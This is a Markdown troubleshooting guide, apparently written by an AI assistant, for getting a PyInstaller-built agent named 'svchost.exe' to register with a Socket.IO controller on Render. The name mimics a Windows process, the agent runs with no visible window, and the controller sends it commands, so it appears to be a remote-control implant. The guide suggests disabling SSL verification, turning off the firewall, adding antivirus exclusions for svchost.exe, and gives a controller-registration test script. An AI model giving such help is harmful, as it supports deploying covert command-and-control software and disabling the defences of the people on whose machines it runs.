# Debugging Agent Connection (Correct URL)

## ✅ Server URL is Correct

Your controller: `https://agent-controller-backend.onrender.com`
Agent configuration: ✅ Already set to this URL (Line 186)

## ❌ Problem: Agent Still Not Showing Up

If the URL is correct but agent isn't appearing, here are the possible causes:

---

## 🔍 Debugging Steps

### Step 1: Enable Console to See What's Happening

**Edit svchost.spec (Line 71):**

```python
# Change from:
console=False,  # NO CONSOLE WINDOW

# To:
console=True,  # SHOW CONSOLE - SEE ERRORS!
```

**Recompile:**
```bash
pyinstaller svchost.spec
```

**Run and watch output:**
```bash
cd dist
svchost.exe
```

---

### Step 2: Check What Messages You See

#### ✅ **GOOD - Connection Successful:**
```
[INFO] Attempting to connect to https://agent-controller-backend.onrender.com...
[OK] Controller is reachable (HTTP 200)
[OK] Connected to server successfully!
[INFO] Registering agent <ID> with controller...
```
**→ If you see this, connection is working! Problem is elsewhere (see below)**

#### ❌ **BAD - SSL Certificate Error:**
```
[ERROR] SSL: CERTIFICATE_VERIFY_FAILED
[ERROR] Failed to connect to server
```
**→ SSL verification issue. Fix: See "SSL Fix" below**

#### ❌ **BAD - Connection Timeout:**
```
[INFO] Attempting to connect to https://agent-controller-backend.onrender.com...
[ERROR] Connection timeout
[ERROR] Failed to connect to server
```
**→ Network/firewall blocking. Fix: See "Network Fix" below**

#### ❌ **BAD - Connection Refused:**
```
[ERROR] Connection refused
[ERROR] Failed to connect to server
```
**→ Controller might be down/sleeping. Fix: See "Controller Status" below**

---

## 🛠️ Common Fixes

### Fix 1: SSL Certificate Issue

If you see SSL errors, the issue is HTTPS certificate verification.

**Option A: Disable SSL Verification (Quick Fix - Not Recommended for Production)**

Edit `client.py` around line 933:

```python
# BEFORE:
sio = socketio.Client(
    ssl_verify=True,  # Enable SSL verification
    engineio_logger=False,
    logger=False
)

# AFTER:
sio = socketio.Client(
    ssl_verify=False,  # Disable SSL verification ⚠️
    engineio_logger=False,
    logger=False
)
```

Then recompile: `pyinstaller svchost.spec`

**Option B: Fix SSL Certificates (Proper Fix)**

Install/update certificates:
```bash
pip install --upgrade certifi
```

Then recompile.

---

### Fix 2: Controller is Sleeping (Render.com Free Tier)

Render.com free tier apps **sleep after 15 minutes of inactivity**.

**Check if controller is awake:**
1. Open in browser: `https://agent-controller-backend.onrender.com`
2. Wait for it to wake up (can take 30-60 seconds)
3. Then run your agent

**Wake up your controller first, THEN run the agent.**

---

### Fix 3: Firewall/Network Blocking

If connection times out:

1. **Check Windows Firewall:**
   - Allow Python/svchost.exe through firewall
   - Or temporarily disable firewall to test

2. **Check Antivirus:**
   - Some antivirus blocks outgoing connections
   - Add exclusion for svchost.exe

3. **Test Connection Manually:**
   ```bash
   curl https://agent-controller-backend.onrender.com
   # Or open in browser - should get a response
   ```

---

### Fix 4: Agent Connects but Doesn't Register

If you see "Connected successfully" but agent doesn't appear on controller:

**Possible causes:**
1. Controller might not be listening for `agent_connect` event
2. Agent ID registration might be failing
3. Controller UI might not be updating

**Debug steps:**

1. **Check agent ID:**
   - Console should show: `[INFO] Registering agent <ID> with controller...`
   - Note down the Agent ID

2. **Check controller logs:**
   - On Render.com dashboard, check your controller's logs
   - Look for agent connection messages

3. **Manually verify on controller:**
   - Does controller have an endpoint to list agents?
   - Check if agent appears in backend but not UI

---

## 🧪 Quick Test Script

Create a simple test to verify connection:

**test_connection.py:**
```python
import socketio
import time

# Test connection to your controller
sio = socketio.Client(ssl_verify=False)

try:
    print("Testing connection to https://agent-controller-backend.onrender.com...")
    sio.connect('https://agent-controller-backend.onrender.com', wait_timeout=30)
    print("✅ Connected successfully!")
    
    # Try to register
    sio.emit('agent_connect', {'agent_id': 'test-agent-123'})
    print("✅ Sent agent_connect event")
    
    time.sleep(5)
    sio.disconnect()
    print("✅ Test complete")
    
except Exception as e:
    print(f"❌ Connection failed: {e}")
```

**Run it:**
```bash
python test_connection.py
```

This will show exactly what's failing.

---

## 📊 Diagnostic Checklist

Run through this checklist:

- [ ] **Controller is awake** (open in browser first)
- [ ] **Compiled with console=True** (can see errors)
- [ ] **SSL verification works** (or disabled for testing)
- [ ] **Firewall allows connection** (test with curl/browser)
- [ ] **Agent shows "Connected successfully"** (in console)
- [ ] **Agent shows "Registering agent"** (in console)
- [ ] **Controller logs show agent connection** (check Render logs)
- [ ] **Agent ID is being sent** (check console output)

---

## 🎯 Most Likely Issues (in order):

### 1. **Controller is Sleeping** (Render Free Tier)
- **Symptom:** Connection timeout or long delay
- **Fix:** Wake controller first (open in browser), THEN run agent

### 2. **SSL Certificate Error**
- **Symptom:** SSL/CERTIFICATE_VERIFY_FAILED error
- **Fix:** Disable SSL verification (ssl_verify=False) temporarily

### 3. **Agent Connects but Doesn't Register**
- **Symptom:** "Connected successfully" but not visible on controller
- **Fix:** Check controller logs, verify agent_connect event handler

### 4. **Firewall/Antivirus Blocking**
- **Symptom:** Connection timeout
- **Fix:** Add firewall exception, disable antivirus temporarily

---

## 🚀 Recommended Debug Process

**Step-by-step debugging:**

```bash
# 1. Wake up your controller
# Open in browser: https://agent-controller-backend.onrender.com
# Wait until it loads (may take 30-60 seconds)

# 2. Enable console mode
# Edit svchost.spec line 71: console=True

# 3. Optionally disable SSL verification (if SSL errors)
# Edit client.py line 933: ssl_verify=False

# 4. Recompile
pyinstaller svchost.spec

# 5. Run and watch output
cd dist
svchost.exe

# 6. Look for these messages:
# "[OK] Connected to server successfully!"
# "[INFO] Registering agent <ID> with controller..."

# 7. Check controller dashboard
# Agent should appear within 5-10 seconds

# 8. If agent appears but not visible, check controller logs on Render
```

---

## 📱 Check Controller Status

**Quick checks:**

1. **Is controller running?**
   ```
   Browser: https://agent-controller-backend.onrender.com
   Should load a page (not error)
   ```

2. **Is controller awake? (Render free tier sleeps)**
   - First load might take 30-60 seconds
   - Watch for "waking up" message
   - Wait until fully loaded

3. **Check Render dashboard:**
   - Go to Render.com dashboard
   - Check your service status
   - View logs for errors

4. **Does controller accept Socket.IO connections?**
   - Controller must be running Socket.IO server
   - Must listen on same path as agent connects to
   - Check controller code for socket.io setup

---

## ⚡ Quick Fix Commands

```bash
# 1. Enable debug console
# Edit svchost.spec line 71: console=True

# 2. Disable SSL (if needed)
# Edit client.py line 933: ssl_verify=False

# 3. Recompile
pyinstaller svchost.spec

# 4. Wake controller (browser)
# Open: https://agent-controller-backend.onrender.com
# Wait 30-60 seconds until loaded

# 5. Run agent
cd dist
svchost.exe

# 6. Watch console for connection messages
```

---

## 🔍 What to Look For

**In agent console:**
```
✅ "[OK] Connected to server successfully!"
✅ "[INFO] Registering agent <ID> with controller..."
```

**In controller logs (Render dashboard):**
```
✅ "Agent connected: <agent-id>"
✅ "New agent registered"
```

**In controller UI/dashboard:**
```
✅ Agent appears in connected agents list
✅ Agent ID is visible
✅ Can send commands to agent
```

---

## 💡 Pro Tip

**For Render.com free tier:**

Your controller sleeps after 15 minutes of inactivity. This means:

1. **Before running agent:** Wake controller by opening it in browser
2. **Wait for controller to fully load** (30-60 seconds on first wake)
3. **Then run agent** - it should connect immediately

**Or upgrade to paid tier** to keep controller always awake.

---

## 📄 Next Steps

1. **Enable console mode** to see what's happening
2. **Wake up your controller** (open in browser first)
3. **Run agent** and watch console output
4. **Share console output** if still not working

The console output will tell us exactly what's wrong!
